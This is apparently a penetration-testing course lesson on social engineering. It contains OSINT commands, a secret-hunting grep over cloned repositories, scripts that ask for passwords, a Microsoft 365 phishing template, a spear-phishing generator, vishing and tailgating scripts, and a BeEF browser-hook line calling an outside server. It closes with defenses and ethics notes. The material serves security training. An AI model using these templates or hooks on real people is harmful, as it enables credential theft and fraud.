# LESSON 12: Social Engineering Attacks

## Objective
Master open-source intelligence (OSINT) gathering and social engineering techniques. Learn to collect information about targets, create convincing pretexts, and execute social engineering attacks while maintaining ethical boundaries.

## Prerequisites
- Lessons 1-11 completed
- Understanding of psychology and human behavior
- Knowledge of social media platforms
- Basic research methodology

## Phase 1: Open Source Intelligence (OSINT)

### Step 1: Target Identification and Scoping
```bash
# Domain enumeration
whois target-domain.com
dig target-domain.com ANY
nslookup target-domain.com

# Subdomain discovery
subfinder -d target-domain.com -o subdomains.txt
assetfinder --subs-only target-domain.com

# DNS records analysis
dnsrecon -d target-domain.com
dnsrecon -d target-domain.com -t brt -D /usr/share/dnsrecon/namelist.txt
```

### Step 2: Social Media Intelligence
```bash
# LinkedIn reconnaissance
# Manual browsing required - automated scraping violates ToS
# Search for: "site:linkedin.com/in company-name"
# Identify key employees, roles, technologies

# GitHub intelligence
git clone https://github.com/target-user/repository
# Search for secrets, credentials, internal information
grep -r "password\|secret\|api_key" .
git log --oneline | head -50

# Social media footprinting
# Twitter: Advanced search for company mentions
# Facebook: Company pages, employee profiles
# Instagram: Geotagged photos, office locations
```

### Step 3: Email and Personnel Discovery
```bash
# Email format identification
# Common formats: first.last@domain.com, flast@domain.com, first@domain.com

# Employee enumeration via search engines
# Google dorks:
# site:linkedin.com/in "company name" "software engineer"
# site:github.com "user@company.com"

# Email validation
# Use online tools carefully - avoid alerting targets
# hunter.io, voila norbert, clearbit connect (use ethically)

# Breach database searches
# haveibeenpwned.com API (for legitimate research)
curl "https://haveibeenpwned.com/api/v3/breachedaccount/email@domain.com"
```

### Step 4: Infrastructure Intelligence
```bash
# IP range identification
whois -h whois.arin.net "n + company-name"
nmap --script whois-ip target-ip

# Certificate transparency logs
curl -s "https://crt.sh/?q=%.target-domain.com&output=json" | jq -r '.[].name_value' | sort -u

# Shodan reconnaissance
# Use shodan.io web interface or API
# Search for: org:"Company Name" or net:"IP Range"

# Google dorks for infrastructure
# site:target-domain.com filetype:pdf
# site:target-domain.com inurl:admin
# site:target-domain.com intitle:"index of"
```

## Phase 2: Information Weaponization

### Step 5: Target Profiling
```python
# Create target profiles with gathered information
target_profile = {
    "personal": {
        "name": "John Doe",
        "position": "Senior Developer",
        "email": "john.doe@company.com",
        "phone": "+1-555-0123",
        "social_media": {
            "linkedin": "linkedin.com/in/johndoe",
            "twitter": "@johndoe_dev"
        }
    },
    "professional": {
        "company": "Tech Corp Inc",
        "department": "Engineering",
        "technologies": ["Python", "AWS", "React"],
        "projects": ["Project Alpha", "Migration Beta"],
        "colleagues": ["Jane Smith", "Bob Johnson"]
    },
    "behavioral": {
        "interests": ["Coffee", "Photography", "Open Source"],
        "communication_style": "Technical, detail-oriented",
        "likely_passwords": ["TechCorp2023!", "Photography123"]
    }
}
```

### Step 6: Pretext Development
```bash
# Common pretexts for social engineering:

# IT Support Pretext
"Hi John, this is Mike from IT Support. We're experiencing some 
network issues and need to verify your login credentials to ensure 
your account hasn't been compromised. Can you please confirm your 
current password?"

# Vendor/Partner Pretext  
"Hello, I'm Sarah from CloudSecure, your company's new security 
vendor. We're conducting a mandatory security audit and need to 
verify access to your development environment."

# Internal Transfer Pretext
"Hi, this is David from HR. I'm calling regarding your upcoming 
department transfer. We need to update your system access. Could 
you verify your current login information?"

# Urgency/Authority Pretext
"This is Jennifer, assistant to the CTO. There's an urgent security 
issue and we need immediate access to the production systems. 
The CTO is in a meeting and asked me to get the admin credentials 
from you immediately."
```

## Phase 3: Electronic Social Engineering

### Step 7: Phishing Email Development
```html
<!-- Professional phishing email template -->
<!DOCTYPE html>
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .header { background: #0078d4; color: white; padding: 20px; }
        .content { padding: 20px; border: 1px solid #ddd; }
        .button { background: #0078d4; color: white; padding: 10px 20px; text-decoration: none; }
    </style>
</head>
<body>
    <div class="header">
        <h2>Microsoft Office 365 - Security Alert</h2>
    </div>
    <div class="content">
        <p>Dear {{target_name}},</p>
        <p>We detected unusual sign-in activity on your Office 365 account from:</p>
        <ul>
            <li>Location: Beijing, China</li>
            <li>IP: 192.168.1.100</li>
            <li>Time: {{current_time}}</li>
        </ul>
        <p>If this was you, no action is needed. If not, please secure your account immediately:</p>
        <p><a href="{{phishing_url}}" class="button">Secure My Account</a></p>
        <p>Microsoft Security Team</p>
    </div>
</body>
</html>
```

### Step 8: Spear Phishing Campaigns
```python
# Personalized phishing email generator
def generate_spear_phishing_email(target):
    # Use gathered OSINT to personalize
    email_template = f"""
Subject: Re: {target['recent_project']} - Urgent Security Update

Hi {target['name']},

Following our discussion about {target['recent_project']}, I wanted to 
share the updated security documentation that {target['manager']} requested.

The document contains sensitive information about our {target['technology']} 
infrastructure, so it requires authentication to access.

Please review at your earliest convenience:
{target['phishing_url']}

Best regards,
{target['trusted_colleague']}
{target['company']} - {target['department']}
"""
    return email_template
```

### Step 9: Voice Social Engineering (Vishing)
```bash
# Vishing script template
SCRIPT="
Hello, may I speak with John Doe please?

Hi John, this is Sarah from IT Security at TechCorp. How are you doing today?

I'm calling because we've detected some unusual activity on your account. 
Nothing serious, but we need to verify a few things to ensure your account 
is secure.

For verification purposes, could you please confirm:
1. Your employee ID number
2. Your current password  
3. The last 4 digits of your direct deposit account

This is just a standard security procedure we're implementing across 
all departments.

[If questioned about legitimacy]
I understand your concern about security. You can call our main IT line 
at 555-0100 and ask for Sarah in Security. However, I have you on the 
line now and this will only take a minute to resolve.
"
```

## Phase 4: Physical Social Engineering

### Step 10: Pretexting for Physical Access
```bash
# Delivery person pretext
"Hi, I have a package delivery for [Target Company]. The delivery 
requires a signature from someone in the IT department. Could you 
help me find them?"

# Maintenance worker pretext  
"I'm here for the scheduled HVAC maintenance. The work order says 
I need access to the server room to check the cooling systems."

# Job interview pretext
"Hello, I have an interview scheduled with [Manager Name] at 2 PM. 
Could someone please escort me to their office?"

# Tailgating techniques
- Follow legitimate employees through secure doors
- Carry coffee/boxes to appear busy and legitimate
- Dress appropriately for the environment
- Act confident and belong
```

### Step 11: Badge Cloning and RFID Attacks
```bash
# RFID badge analysis
# Use tools like Proxmark3 for research purposes only

# Badge cloning process (educational)
# 1. Identify badge frequency (125kHz, 13.56MHz, etc.)
# 2. Clone badge using appropriate hardware
# 3. Test cloned badge functionality

# Physical security bypass
# Look for:
# - Magnetic door locks
# - Card readers
# - Biometric systems
# - Mantrap systems
```

## Phase 5: Social Engineering Frameworks

### Step 12: Social Engineering Toolkit (SET)
```bash
# Install and use SET
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
python setup.py install

# SET menu options:
# 1) Social-Engineering Attacks
# 2) Penetration Testing (Fast-Track)
# 3) Third Party Modules
# 4) Update the Social-Engineer Toolkit

# Common SET attacks:
# - Credential Harvester Attack Method
# - Website Attack Vectors
# - Infectious Media Generator
# - Mass Mailer Attack
```

### Step 13: BeEF (Browser Exploitation Framework)
```bash
# BeEF setup
git clone https://github.com/beefproject/beef.git
cd beef
./install

# Start BeEF
./beef

# Hook browsers with JavaScript
<script src="http://beef-server:3000/hook.js"></script>

# BeEF modules:
# - Social Engineering (Fake notifications, popups)
# - Network (Port scanning from victim browser)
# - Exploits (Browser-based exploitation)
# - Tunneling (Proxy through victim browser)
```

## Phase 6: Psychological Manipulation Techniques

### Step 14: Influence and Persuasion
```bash
# Cialdini's principles of influence:

# 1. Reciprocity
"I helped you with the server issue last week, could you help me 
access this system?"

# 2. Commitment/Consistency  
"You mentioned security is your top priority, so I'm sure you'll 
want to update your password immediately."

# 3. Social Proof
"Everyone in the IT department has already updated their credentials 
for the new security policy."

# 4. Authority
"The CTO personally asked me to collect all admin passwords for 
the security audit."

# 5. Liking
Build rapport by finding common ground, similar interests, or 
complimenting the target.

# 6. Scarcity
"This security vulnerability affects only a few accounts. You're 
on the priority list for immediate remediation."
```

### Step 15: Elicitation Techniques
```bash
# Information gathering through conversation:

# Direct questioning (risky)
"What's the WiFi password?"

# Indirect elicitation (better)
"I'm having trouble connecting to the guest network. What network 
do you usually use for visitors?"

# Assumptive elicitation
"Is the WiFi password still TechCorp2023, or did IT change it again?"

# Provocative elicitation
"I heard your company's security is pretty weak. Bet anyone could 
guess the WiFi password."

# Flattery elicitation
"You seem really technical. I bet you know all about the network 
setup here."
```

## Custom Scripts Usage

### osint_gatherer.py
```bash
# Automated OSINT collection
python3 scripts/lesson_12_social_engineering/osint_gatherer.py --target company.com --output osint_report.json
```

### phishing_generator.py
```bash
# Dynamic phishing campaign generator
python3 scripts/lesson_12_social_engineering/phishing_generator.py --target-list employees.txt --template office365 --server http://phishing-server.com
```

## Evidence Collection

### Step 16: Document Social Engineering Success
```bash
# OSINT findings documentation
echo "$(date): Collected email addresses, employee names, and technology stack" >> osint_log.txt

# Social engineering attempt logging
echo "$(date): Successful credential harvest from john.doe@company.com" >> phishing_log.txt

# Physical access documentation
echo "$(date): Gained building access via tailgating through main entrance" >> physical_access_log.txt
```

## Success Criteria

✓ Comprehensive OSINT profile created
✓ Employee information gathered
✓ Effective pretext developed
✓ Phishing campaign executed
✓ Voice social engineering practiced
✓ Physical access techniques learned
✓ Social engineering frameworks utilized
✓ Custom scripts functioning

## OSINT Tools Summary

| Tool | Purpose | Platform |
|------|---------|----------|
| theHarvester | Email enumeration | Python |
| recon-ng | OSINT framework | Python |
| Maltego | Link analysis | Java |
| Shodan | Internet scanning | Web/API |
| SpiderFoot | Automated OSINT | Python |
| FOCA | Metadata analysis | Windows |

## Social Engineering Attack Vectors

### Digital Attacks
- **Phishing**: Fraudulent emails requesting credentials
- **Spear Phishing**: Targeted emails using personal information
- **Vishing**: Voice-based social engineering
- **Smishing**: SMS-based attacks
- **Watering Hole**: Compromising frequently visited websites

### Physical Attacks  
- **Tailgating**: Following authorized personnel
- **Dumpster Diving**: Searching discarded documents
- **Badge Cloning**: Duplicating access cards
- **Shoulder Surfing**: Observing password entry
- **USB Drops**: Leaving infected USB devices

## Defense Recommendations

### Technical Controls
- Email filtering and anti-phishing
- Multi-factor authentication
- User activity monitoring
- Network segmentation
- Regular security assessments

### Administrative Controls
- Security awareness training
- Social engineering simulations
- Incident response procedures
- Vendor verification processes
- Information classification policies

### Physical Controls
- Access control systems
- Video surveillance
- Clean desk policy
- Secure document disposal
- Visitor management

## Ethical Guidelines

⚠️ **CRITICAL**: Social engineering techniques must only be used for:
- Authorized penetration testing
- Security awareness training
- Personal education in controlled environments

**NEVER** use these techniques for:
- Unauthorized access to systems
- Personal gain or harassment
- Causing harm to individuals or organizations

## Legal Considerations

- Obtain explicit written authorization
- Define clear scope and boundaries
- Document all activities
- Report findings responsibly
- Respect privacy laws and regulations

## Next Lesson Preview
**Lesson 13**: Red Team Operations & Advanced Persistence
- Command and control (C2) frameworks
- Advanced evasion techniques
- Long-term persistence methods